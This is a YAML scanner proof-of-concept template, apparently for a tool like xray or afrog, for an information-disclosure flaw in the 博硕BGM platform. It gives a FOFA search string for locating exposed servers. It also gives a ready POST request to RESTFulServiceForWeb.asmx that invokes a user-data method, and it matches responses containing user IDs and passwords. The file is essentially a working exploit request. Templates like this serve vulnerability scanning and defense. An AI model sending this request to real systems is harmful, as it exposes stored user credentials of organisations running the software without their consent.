id: poc-yaml-bosure-bgm-restfulserviceforweb-asmx-info-leak
info:
  name: 博硕BGM RESTFulServiceForWeb.asmx 信息泄露漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: 博硕BGM
  fofa: body="Libs/Platform.lib"
requests:
- method: POST
  path: /Service/RESTFulWebService/RESTFulServiceForWeb.asmx/Do?id=
  headers:
    Content-Type: application/json
  data: '{"Resource":"MethodCluster","Parameter":[["Method","Sky.PlatForm.Core.clsUser.GetData"],["Para","{\"$VER$\":{},\"filter\":{\"OrderBy\":\"DeptId,UserId,CreateDate
    DESC\"}}"]]}'
  expression: status_code == 200 && contains(body,"ReturnType") && contains(body,"UserId")
    && contains(body,"UserPassWord") && !contains(body,"<") && contains(content_type,"application/json")
variables: {}
transport: http
